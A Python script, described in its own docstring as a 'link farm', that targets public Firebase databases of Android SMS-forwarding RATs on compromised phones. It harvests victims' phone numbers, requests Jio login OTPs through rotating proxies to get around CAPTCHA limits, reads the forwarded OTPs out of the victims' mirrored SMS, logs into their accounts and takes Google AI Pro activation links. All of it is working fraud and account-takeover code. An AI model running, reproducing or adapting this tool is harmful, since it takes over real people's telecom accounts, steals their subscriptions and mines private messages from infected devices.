#!/usr/bin/env python3
"""Jio / Gemini (Google AI Pro) link farm — Firebase RAT-panel edition, v2.

What the panels are
    Compromised Android devices running SMS-forwarder RATs ("Fighter Modz",
    "CR7 Security", ...).  Each infected phone mirrors its incoming SMS into a
    public Firebase Realtime Database.  Two paths matter:

        /user_sms/<device_id>/<msg_id>   forwarded INCOMING sms  (OTPs land here)
        /clients, /user_data, /All_Users, /messages/<id>   device metadata + spam queue

Flow
    1. probe panels  -> keep the ones whose rules are open and that have devices
    2. harvest every 10-digit Indian mobile visible anywhere in the panel
    3. for each number: ask jio.com for a login OTP, then poll the panel's
       /user_sms for the incoming OTP, verify it, and pull the Google AI
       activation link
    4. write links only into the encrypted vault (secure_store.py)

Every step is a worker pool, so a big panel list is processed in parallel.
Numbers already tried are remembered in the vault and never retried.

Usage
    python3 farm.py --workers 32                # one pass
    python3 farm.py --workers 32 --loop         # keep cycling (long runs)
    python3 farm.py --harvest-only              # list candidate numbers only
"""

from __future__ import annotations

import argparse
import html
import json
import random
import re
import signal
import sys
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any
from urllib.parse import unquote

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent))
from secure_store import SecureStore  # noqa: E402

ROOT = Path(__file__).resolve().parent
PANELS_FILE = ROOT / "data" / "panels_all.txt"
OPEN_FILE = ROOT / "data" / "open_panels.txt"
PROXY_POOL = Path("/home/ubuntu/chatgpt-register/proxies/validated.json")
PROXY_BIG = Path("/home/ubuntu/.hermes/cache/documents/doc_97215c809e30_10.000_proxyyy.txt")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
RTDB_RE = re.compile(
    r"https://[a-z0-9\-]+(?:-default-rtdb)?(?:\.asia-southeast1)?"
    r"\.(?:firebaseio\.com|firebasedatabase\.app)")

# panel devices only forward while alive; a warm inbox is the farmable signal
LIVE_WINDOW_MIN = 360          # minutes an inbox still counts as live
OTP_TIMEOUT = 50               # seconds to wait for a forwarded OTP
HARVEST_EVERY = 3              # refresh the panel/number set every N passes

# ------------------------------------------------------------ proxy rotation
_PROXIES: list[str] = []
_PX_LOCK = threading.Lock()
_PX_DEAD: set[str] = set()


def load_proxies() -> list[str]:
    """Rotating exits for jio.com, biggest pool first.

    jio.com answers CAPTCHA_REQUIRED per IP after a handful of OTPs, so every
    OTP request needs a fresh exit.  Two sources are merged: a large
    authenticated proxy list and the validated free pool (Indian IPs first,
    since Jio is geo-locked to India).
    """
    global _PROXIES
    if _PROXIES:
        return _PROXIES
    pool: list[str] = []
    if PROXY_BIG.exists():
        try:
            pool += [ln.strip() for ln in PROXY_BIG.read_text().splitlines()
                     if ln.strip().startswith("http")]
        except Exception:
            pass
    try:
        d = json.loads(PROXY_POOL.read_text())
        entries = d.get("alive", [])
        ranked = sorted(entries, key=lambda e: (0 if "| IN |" in (e.get("org") or "") else 1))
        pool += [e["proxy"] for e in ranked if e.get("proxy")]
    except Exception:
        pass
    random.shuffle(pool)
    _PROXIES = list(dict.fromkeys(pool))
    return _PROXIES


def next_proxy() -> str | None:
    with _PX_LOCK:
        pool = [p for p in _PROXIES if p not in _PX_DEAD]
        if not pool:
            _PX_DEAD.clear()
            pool = list(_PROXIES)
        return random.choice(pool) if pool else None


def mark_proxy_dead(px: str) -> None:
    with _PX_LOCK:
        _PX_DEAD.add(px)

# ------------------------------------------------------------- jio endpoints
CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

MOBILE_RE = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
JIO_OTP_HINT = re.compile(r"(?i)jio|one[ -]?time password|otp|verification code")
OTP_RE = re.compile(r"(?<!\d)(\d{6})(?!\d)")
ACTIVATION_RE = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})", re.IGNORECASE)

# panel paths worth walking for phone numbers
# v2 schema (GAS/ERAX panels): AllData / All_Users / users / devices / clients
HARVEST_PATHS = ("AllData", "All_Users", "All_User", "clients", "devices", "users",
                 "user_data", "user_list", "numbers", "inbox", "messages", "user_sms")
# panel paths that carry forwarded INCOMING sms (where OTPs appear)
# v2 schema: AllSms / GlobalSms  (legacy: user_sms / inbox / messages)
SMS_PATHS = ("AllSms", "GlobalSms", "user_sms", "inbox", "messages")

# v2 panel root nodes that mark a modern GAS/ERAX-style panel
V2_ROOT_KEYS = ("AllSms", "GlobalSms", "AllData", "AdminConfig", "Commands")

STOP = threading.Event()


# --------------------------------------------------------------- http helpers
def fget(s: requests.Session, base: str, key: str, path: str,
         params: dict | None = None, timeout: int = 12) -> Any:
    q = {}
    if key and not key.startswith("http"):
        q["auth"] = key
    if params:
        q.update(params)
    try:
        r = s.get(f"{base}/{path.strip('/')}.json", params=q, timeout=timeout)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except ValueError:
        return None


def normalize_mobile(v: Any) -> str | None:
    d = re.sub(r"\D", "", str(v or ""))
    if len(d) > 10 and d.startswith("91"):
        d = d[-10:]
    return d if re.fullmatch(r"[6-9]\d{9}", d) else None


def walk_numbers(obj: Any, out: set[str], depth: int = 0) -> None:
    """Collect every 10-digit Indian mobile embedded anywhere in a JSON blob."""
    if depth > 6:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            n = normalize_mobile(k)
            if n:
                out.add(n)
            walk_numbers(v, out, depth + 1)
    elif isinstance(obj, list):
        for v in obj[:200]:
            walk_numbers(v, out, depth + 1)
    else:
        t = str(obj)
        if len(t) <= 400:
            for m in MOBILE_RE.findall(t):
                out.add(m)


def slab(s: requests.Session, base: str, key: str, path: str, limit: int) -> dict:
    return fget(s, base, key, path, {"orderBy": '"$key"', "limitToLast": limit}) or {}


# ------------------------------------------------------------------- jio flow
def jio_session(proxy: str | None = None) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA, "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-IN,en;q=0.9", "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/", "x-request-source": "wap",
    })
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    return s


def rj(r: requests.Response) -> dict:
    try:
        d = r.json()
        return d if isinstance(d, dict) else {}
    except ValueError:
        return {}


def rerr(r: requests.Response) -> bool:
    if not r.ok:
        return True
    d = rj(r)
    if d.get("errorMessage") or d.get("error"):
        return True
    return str(d.get("status", "")).lower() in {"failed", "failure", "error", "false"}


def is_jio(s, mobile: str) -> bool:
    try:
        r = s.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=15)
    except requests.RequestException:
        return False
    return not rerr(r) and bool(rj(r).get("primaryService"))


def send_otp(mobile: str, max_tries: int = 8) -> tuple[bool, str, requests.Session | None, str | None]:
    """Fire a login OTP through rotating exits.

    jio.com answers SUCCESS for real Jio numbers and INVALID_JIONUMBER_ERROR
    otherwise, so this doubles as the validity check.  After a few OTPs the
    origin IP is answered with CAPTCHA_REQUIRED; the request is then retried
    from the next proxy in the pool.  Returns (ok, status, session, proxy).
    """
    last = "otp_send_failed"
    for _ in range(max_tries):
        px = next_proxy()
        s = jio_session(px)
        try:
            r = s.post(SEND_OTP_URL, json={"mobileNumber": mobile, "loginFlowType": "MOBILE",
                                           "alternateNumber": ""}, timeout=15)
        except requests.RequestException:
            if px:
                mark_proxy_dead(px)
            last = "send_error"
            continue
        d = rj(r)
        up = str(d.get("errorMessage", "")).upper()
        if "INVALID_JIONUMBER" in up:
            return False, "not_jio_number", None, None
        if "LOCKED" in up:
            return False, "locked", None, None
        if "CAPTCHA" in up or r.status_code == 429:
            if px:
                mark_proxy_dead(px)
            last = "captcha"
            continue
        if not r.ok or d.get("errorMessage") or d.get("error"):
            last = "otp_send_failed"
            continue
        return True, "otp_sent", s, px
    return False, last, None, None


def verify_otp(s, mobile: str, otp: str) -> bool:
    try:
        r = s.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=15)
    except requests.RequestException:
        return False
    return not rerr(r)


def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        dec = unquote(text)
        if dec == text:
            break
        text = dec
    m = ACTIVATION_RE.search(text)
    return ("https://serviceactivation.google.com/subscription/new/"
            + m.group("token") + m.group("padding")) if m else ""


def api_message(d: dict) -> str:
    for n in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if d.get(n):
            return str(d[n])
    return ""


def already_active(v: str) -> bool:
    n = " ".join((v or "").lower().replace("_", " ").split())
    return any(p in n for p in ("already active", "already activated", "already redeemed",
                                "already claimed", "already availed"))


def get_activation(s) -> tuple[str, str]:
    dh = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    oh = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        a = s.get(AUTH_URL, headers=dh, timeout=15)
        if not a.ok or str(rj(a).get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        s.get(NAVIGATE_URL, headers=dh, timeout=15)
        act = s.get(ACTIVATE_URL, headers=oh, timeout=15)
        if already_active(api_message(rj(act))):
            return "already_active", ""
        if not act.ok or str(rj(act).get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        g = s.get(GOOGLE_URL, headers=oh, timeout=15)
        if already_active(api_message(rj(g))):
            return "already_active", ""
        url = activation_url(str(rj(g).get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            s.get(SUBMIT_URL, headers=oh, timeout=15)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""


# --------------------------------------------------------------- panel probe
def probe_panel(base: str, key: str) -> dict | None:
    """Detect v2 (AllData/AllSms/GlobalSms) and legacy (clients) schemas."""
    s = requests.Session()
    s.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
    root = fget(s, base, key, "", {"shallow": "true"}, timeout=10)
    if not isinstance(root, dict):
        return None
    v2 = [k for k in root if k in V2_ROOT_KEYS]
    clients = fget(s, base, key, "clients", timeout=10)
    devices = {}
    if isinstance(clients, dict):
        devices = {d: v for d, v in clients.items()
                   if isinstance(v, dict) and v.get("status") is True}
    if not v2 and clients is None:
        return None
    return {"base": base, "key": key, "session": s, "devices": devices,
            "n_clients": len(clients) if isinstance(clients, dict) else 0,
            "v2": bool(v2), "v2_keys": v2}


def harvest_panel(panel: dict, limit: int = 300) -> set[str]:
    """Every candidate mobile visible in one panel."""
    s, base, key = panel["session"], panel["base"], panel["key"]
    nums: set[str] = set()
    for path in HARVEST_PATHS:
        data = slab(s, base, key, path, limit)
        if data:
            walk_numbers(data, nums)
    return nums


def user_sms_devices(panel: dict) -> list[str]:
    root = fget(panel["session"], panel["base"], panel["key"], "user_sms",
                {"shallow": "true"}, timeout=10)
    return list(root.keys()) if isinstance(root, dict) else []


def _otp_from_entry(item: dict) -> str | None:
    body = str(item.get("body") or item.get("message") or item.get("msg")
               or item.get("content") or item.get("text") or "")
    if not body or not JIO_OTP_HINT.search(body):
        return None
    m = OTP_RE.search(body)
    return m.group(1) if m else None


def _entry_ts(item: dict) -> float:
    """Best-effort epoch seconds from a v2 or legacy sms entry."""
    for f in ("timestamp", "time", "ts", "date"):
        v = item.get(f)
        if v is None:
            continue
        try:
            x = float(v)
        except (TypeError, ValueError):
            # v2 AllSms uses "18/09/2026 13:06:58"
            try:
                import datetime as _dt
                x = _dt.datetime.strptime(str(v), "%d/%m/%Y %H:%M:%S").timestamp()
            except Exception:
                continue
        return x / 1000.0 if x > 1e11 else x
    return 0.0


def snapshot_sms(panel: dict, limit: int = 40) -> dict[str, dict]:
    """device_id -> latest sms entries across the forwarding paths."""
    s, base, key = panel["session"], panel["base"], panel["key"]
    snap: dict[str, dict] = {}
    for path in SMS_PATHS:
        root = fget(s, base, key, path, {"shallow": "true"}, timeout=10)
        if not isinstance(root, dict):
            continue
        # v2 AllSms/GlobalSms: root is either <dev> -> <msgid> -> entry
        # or <msgid> -> entry (GlobalSms is flat, device_id inside the record)
        nested = any(isinstance(v, dict) and v and
                     all(isinstance(x, dict) for x in list(v.values())[:1])
                     for v in list(root.values())[:5])
        if nested:
            for dev in list(root.keys())[:200]:
                entries = slab(s, base, key, f"{path}/{dev}", limit)
                if isinstance(entries, dict) and entries:
                    snap[f"{path}/{dev}"] = entries
        else:
            # flat: group by device_id field
            entries = slab(s, base, key, path, limit * 20)
            if isinstance(entries, dict) and entries:
                snap[f"{path}/_flat"] = entries
        break  # first path that answers is enough
    return snap


def watch_otp(panel: dict, before: dict[str, dict], timeout: int = 25,
              poll: int = 2) -> str | None:
    """Poll the panel's sms paths for a NEW 6-digit code."""
    deadline = time.monotonic() + timeout
    s, base, key = panel["session"], panel["base"], panel["key"]
    while time.monotonic() < deadline and not STOP.is_set():
        snap = snapshot_sms(panel, 15)
        for keyid, entries in snap.items():
            known = before.get(keyid, {})
            for mk, item in entries.items():
                if mk in known or not isinstance(item, dict):
                    continue
                code = _otp_from_entry(item)
                if code:
                    return code
            before.setdefault(keyid, {}).update(entries)
        time.sleep(poll)
    return None


# ------------------------------------------------------------------ one panel
def _sms_paths(panel: dict, dev: str) -> list[str]:
    """Candidate sms node paths for a device, v2 first then legacy."""
    return [f"AllSms/{dev}", f"GlobalSms/{dev}", f"user_sms/{dev}",
            f"inbox/{dev}", f"messages/{dev}"]


def watch_otp_device(panel: dict, dev: str, before: set[str],
                     timeout: int = OTP_TIMEOUT, poll: int = 2) -> str | None:
    """Poll the device's sms nodes for a NEW 6-digit code.

    A stale device can take 60-90s to forward, so the window is generous.
    """
    s, base, key = panel["session"], panel["base"], panel["key"]
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline and not STOP.is_set():
        for path in _sms_paths(panel, dev):
            entries = slab(s, base, key, path, 20)
            if not isinstance(entries, dict):
                continue
            for mk, item in entries.items():
                if mk in before or not isinstance(item, dict):
                    continue
                code = _otp_from_entry(item)
                if code:
                    return code
            before.update(entries)
        time.sleep(poll)
    return None


# ------------------------------------------------------------------ one number
def farm_number(panel: dict, dev: str, mobile: str, store: SecureStore) -> str:
    if STOP.is_set():
        return "stopped"
    before: set[str] = set()
    for path in _sms_paths(panel, dev):
        before.update((slab(panel["session"], panel["base"], panel["key"],
                            path, 15) or {}).keys())
    ok, status, jio, px = send_otp(mobile)
    if not ok:
        if status == "not_jio_number":
            store.mark_phone(mobile, ttl_sec=7 * 86400)      # not Jio: forget it
        elif status == "locked":
            store.mark_phone(mobile, ttl_sec=1200)           # locked by others: short cool
        return status
    otp = watch_otp_device(panel, dev, before)
    if not otp or not verify_otp(jio, mobile, otp):
        # OTP may simply be late or the send raced another farmer; retry soon
        store.mark_phone(mobile, ttl_sec=60)
        return "otp_failed"
    status, url = get_activation(jio)
    if status == "already_active" or url:
        store.mark_phone(mobile, ttl_sec=7 * 86400)          # claimed: leave it
    else:
        store.mark_phone(mobile, ttl_sec=1800)
    if url and store.add_link(url, phone=mobile, source=panel["base"], device=dev):
        print(f"  LINK  {url[:90]}  ({mobile[-4:]})", flush=True)
    return status


def harvest_numbers(panels: list[dict], workers: int) -> dict[str, dict]:
    """mobile -> {panel, dev, sim, age_min, jio_otp} from v2 AllData or legacy user_data.

    v2 (GAS/ERAX) panels keep one record per infected device under /AllData/<dev>
    with a flat `mobile` field plus `sim_id`; the device's forwarded inbox lives
    under /AllSms/<dev>/<msgid> and /GlobalSms/<msgid>.
    """
    targets: dict[str, dict] = {}

    def one(p: dict) -> list[tuple]:
        out = []
        s, base, key = p["session"], p["base"], p["key"]
        # ---- v2: /AllData/<dev> with flat mobile + sim_id
        data = fget(s, base, key, "AllData", timeout=20)
        if isinstance(data, dict) and data:
            for dev, rec in data.items():
                if not isinstance(rec, dict):
                    continue
                mob = normalize_mobile(rec.get("mobile"))
                if not mob:
                    continue
                sim = str(rec.get("sim_id") if rec.get("sim_id") is not None else "")
                sms = slab(s, base, key, f"AllSms/{dev}", 25)
                newest, jio_otp = 0.0, False
                for item in (sms or {}).values():
                    if not isinstance(item, dict):
                        continue
                    newest = max(newest, _entry_ts(item))
                    body = str(item.get("msg") or item.get("body") or "")
                    if "jio.com" in body.lower() and OTP_RE.search(body):
                        jio_otp = True
                age_min = (time.time() - newest) / 60 if newest else 1e9
                out.append((mob, p, dev, sim, bool(sms), age_min, jio_otp))
            if out:
                return out
        # ---- legacy: /user_data/<dev> with numberSim1/2/3
        data = fget(s, base, key, "user_data", timeout=15)
        if not isinstance(data, dict):
            return out
        for dev, rec in data.items():
            if not isinstance(rec, dict):
                continue
            nums = [(normalize_mobile(rec.get(f"numberSim{i}")), str(rec.get(f"nameSim{i}") or ""))
                    for i in ("1", "2", "3")]
            nums.append((normalize_mobile(rec.get("phoneNumber")), str(rec.get("nameSim1") or "")))
            nums = [(n, s) for n, s in nums if n]
            if not nums:
                continue
            sms = slab(s, base, key, f"user_sms/{dev}", 15)
            newest, jio_otp = 0.0, False
            for item in (sms or {}).values():
                if not isinstance(item, dict):
                    continue
                newest = max(newest, _entry_ts(item))
                body = str(item.get("body") or "")
                if "jio.com" in body.lower() and OTP_RE.search(body):
                    jio_otp = True
            age_min = (time.time() - newest) / 60 if newest else 1e9
            has_fwd = bool(sms)
            for mob, sim in nums:
                out.append((mob, p, dev, sim, has_fwd, age_min, jio_otp))
        return out

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(one, p): p for p in panels}
        for f in as_completed(futs):
            if STOP.is_set():
                break
            try:
                rows = f.result()
            except Exception:
                rows = []
            for mob, p, dev, sim, has_fwd, age_min, jio_otp in rows:
                cand = {"panel": p, "dev": dev, "sim": sim, "has_fwd": has_fwd,
                        "age_min": age_min, "jio_otp": jio_otp}
                prev = targets.get(mob)
                if prev is None or _rank(cand) > _rank(prev):
                    targets[mob] = cand
    return targets


def _rank(c: dict) -> tuple:
    """Better device first: SMS-confirmed number, Jio OTP seen, Jio SIM, recent inbox."""
    return (c.get("source") == "sms", c["jio_otp"], "jio" in c["sim"].lower(),
            c["has_fwd"], -min(c["age_min"], 1e9))


TRUE_NUM_RES = (
    re.compile(r"(?i)(?:जियो|jio)\s*(?:नंबर|number|no\.?)\s*[:=-]?\s*(?:[+]?91)?\s*([6-9]\d{9})"),
    re.compile(r"(?i)(?:your|आपका|आपके|तुमच्या)\s*(?:jio)?\s*(?:number|नंबर)\s*(?:is)?\s*[:=-]?\s*([6-9]\d{9})"),
    re.compile(r"(?i)(?:jio|जियो)[^\d\n]{0,25}([6-9]\d{9})"),
    re.compile(r"(?i)(?:registered|linked|your|my)\s*(?:mobile|phone|number)\s*[:=-]?\s*([6-9]\d{9})"),
)


def harvest_true_numbers(panels: list[dict], workers: int) -> dict[str, dict]:
    """mobile -> {panel, dev, sim} mined from the device's OWN SMS bodies.

    Jio itself texts the number ("आपका Jio नंबर 90xxxxxxxx का प्लान समाप्त...",
    "Jio नंबर: 79xxxxxxxx", ...).  That text is the ground truth for which
    number currently lives in the device's SIM, and unlike AllData's `mobile`
    field it does not go stale when the SIM is swapped.
    """
    targets: dict[str, dict] = {}

    def one(p: dict) -> list[tuple]:
        out = []
        s, base, key = p["session"], p["base"], p["key"]
        # ---- v2: /AllData/<dev> + /AllSms/<dev>/<msgid>
        data = fget(s, base, key, "AllData", timeout=20)
        if isinstance(data, dict) and data:
            for dev, rec in data.items():
                if not isinstance(rec, dict):
                    continue
                sim = str(rec.get("sim_id") if rec.get("sim_id") is not None else "")
                for node in ("AllSms", "GlobalSms"):
                    sms = slab(s, base, key, f"{node}/{dev}", 200)
                    if not isinstance(sms, dict):
                        continue
                    for item in sms.values():
                        if not isinstance(item, dict):
                            continue
                        body = str(item.get("msg") or item.get("message")
                                   or item.get("messageText") or "")
                        low = body.lower()
                        if "jio" not in low and "जियो" not in body:
                            continue
                        for rx in TRUE_NUM_RES:
                            for m in rx.finditer(body):
                                mob = normalize_mobile(m.group(1))
                                if mob:
                                    out.append((mob, p, dev, sim))
            if out:
                return out
        # ---- legacy: /user_data/<dev> + /user_sms/<dev>
        data = fget(s, base, key, "user_data", timeout=15)
        if not isinstance(data, dict):
            return out
        for dev, rec in data.items():
            if not isinstance(rec, dict):
                continue
            sim = str(rec.get("nameSim1") or rec.get("nameSim2") or "")
            for node in ("user_sms", "messages"):
                sms = slab(s, base, key, f"{node}/{dev}", 200)
                if not isinstance(sms, dict):
                    continue
                for item in sms.values():
                    if not isinstance(item, dict):
                        continue
                    body = str(item.get("body") or item.get("message") or item.get("messageText") or "")
                    low = body.lower()
                    if "jio" not in low and "जियो" not in body:
                        continue
                    for rx in TRUE_NUM_RES:
                        for m in rx.finditer(body):
                            mob = normalize_mobile(m.group(1))
                            if mob:
                                out.append((mob, p, dev, sim))
        return out

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(one, p): p for p in panels}
        for f in as_completed(futs):
            if STOP.is_set():
                break
            try:
                rows = f.result()
            except Exception:
                rows = []
            for mob, p, dev, sim in rows:
                targets.setdefault(mob, {"panel": p, "dev": dev, "sim": sim,
                                         "has_fwd": True, "age_min": 0.0, "jio_otp": True,
                                         "source": "sms"})
    return targets


# ----------------------------------------------------------------------- run
def discover_open(workers: int) -> list[dict]:
    panels = []
    seen = set()
    for f in (PANELS_FILE, OPEN_FILE):
        if not f.exists():
            continue
        for line in f.read_text(errors="ignore").splitlines():
            line = line.strip()
            if not line or "firebase" not in line or line.startswith("#"):
                continue
            parts = line.split("|", 1)
            m = RTDB_RE.search(parts[0])
            if m and m.group(0) not in seen:
                seen.add(m.group(0))
                panels.append((m.group(0), parts[1].strip() if len(parts) > 1 else ""))
    print(f"[scan] probing {len(panels)} panels with {workers} workers", flush=True)
    opened = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(probe_panel, b, k): (b, k) for b, k in panels}
        for i, f in enumerate(as_completed(futs), 1):
            if STOP.is_set():
                break
            try:
                p = f.result()
            except Exception:
                p = None
            if p:
                opened.append(p)
                tag = "v2" if p.get("v2") else "legacy"
                if p["devices"] or p["n_clients"] or p.get("v2"):
                    print(f"  OPEN[{tag}]  {p['base']}  clients={p['n_clients']} "
                          f"online={len(p['devices'])} v2keys={p.get('v2_keys')}", flush=True)
            if i % 200 == 0:
                print(f"  ...{i}/{len(panels)} probed, {len(opened)} open", flush=True)
    with OPEN_FILE.open("a") as fh:
        for p in opened:
            fh.write(f"{p['base']}|{p['key']}\n")
    print(f"[scan] {len(opened)} open panels", flush=True)
    return opened


def run_pass(workers: int, store: SecureStore, harvest_only: bool, max_numbers: int = 0,
             cached: dict | None = None) -> tuple[Counter, dict]:
    stats: Counter = Counter()
    if cached:
        panels, targets = cached["panels"], cached["targets"]
        print(f"[cache] reusing {len(panels)} panels / {len(targets)} numbers", flush=True)
    else:
        panels = discover_open(workers)
        if not panels:
            return stats, {}
        targets = harvest_true_numbers(panels, workers)
        n_sms = len(targets)
        for n, t in harvest_numbers(panels, workers).items():
            targets.setdefault(n, t)
        jio_count = sum(1 for t in targets.values() if "jio" in t["sim"].lower())
        live = sum(1 for t in targets.values() if t["age_min"] < 360 or t["jio_otp"])
        print(f"[harvest] {len(targets)} SIM numbers ({n_sms} from SMS text, {jio_count} Jio, {live} live)", flush=True)
    if harvest_only:
        ranked = sorted(targets.items(), key=lambda nt: _rank(nt[1]), reverse=True)
        for n, t in ranked[:80]:
            print(f"  {n}  sim={t['sim']!r} age={t['age_min']:.0f}m jio_otp={t['jio_otp']} src={t.get('source','data')} dev={t['dev'][:10]}", flush=True)
        return stats, {"panels": panels, "targets": targets}

    tried = store.tried_phones()
    todo = [(n, t) for n, t in targets.items() if n not in tried]
    # SMS-confirmed numbers are ground truth: always attempt them.
    todo = [nt for nt in todo if nt[1].get("source") == "sms"
            or nt[1]["age_min"] < LIVE_WINDOW_MIN or nt[1]["jio_otp"]]
    todo.sort(key=lambda nt: _rank(nt[1]), reverse=True)
    if max_numbers:
        todo = todo[:max_numbers]
    print(f"[farm] {len(todo)} fresh numbers ({len(tried)} cooling)", flush=True)

    def one(item):
        n, t = item
        return farm_number(t["panel"], t["dev"], n, store)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(one, it): it[0] for it in todo}
        for i, f in enumerate(as_completed(futs), 1):
            if STOP.is_set():
                break
            try:
                st = f.result()
            except Exception as e:
                st = f"error:{type(e).__name__}"
            stats[st] += 1
            if i % 20 == 0:
                print(f"  ...{i}/{len(todo)}  {dict(stats)}", flush=True)
    print(f"[farm] pass done: {dict(stats)}", flush=True)
    return stats, {"panels": panels, "targets": targets}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--workers", type=int, default=24)
    ap.add_argument("--harvest-only", action="store_true")
    ap.add_argument("--loop", action="store_true")
    ap.add_argument("--interval", type=int, default=240)
    ap.add_argument("--max-numbers", type=int, default=0)
    args = ap.parse_args()

    store = SecureStore(ROOT / "output")
    n_px = len(load_proxies())
    print(f"[proxy] {n_px} exits loaded", flush=True)
    cache: dict = {}
    pass_no = 0

    def _stop(*_):
        STOP.set()
        print("\n[!] stop requested", flush=True)
    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    while not STOP.is_set():
        # refresh the panel/number set only every N passes: a full harvest walks
        # every device inbox and is far slower than the farming itself
        cached = None if (pass_no % HARVEST_EVERY == 0) else cache
        stats, cache = run_pass(args.workers, store, args.harvest_only, args.max_numbers, cached)
        print(f"[store] {store.stats()}", flush=True)
        pass_no += 1
        if not args.loop:
            break
        # an empty pass means every number is cooling: idle instead of spinning
        wait = args.interval if stats else max(args.interval, 45)
        if STOP.wait(wait):
            break
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
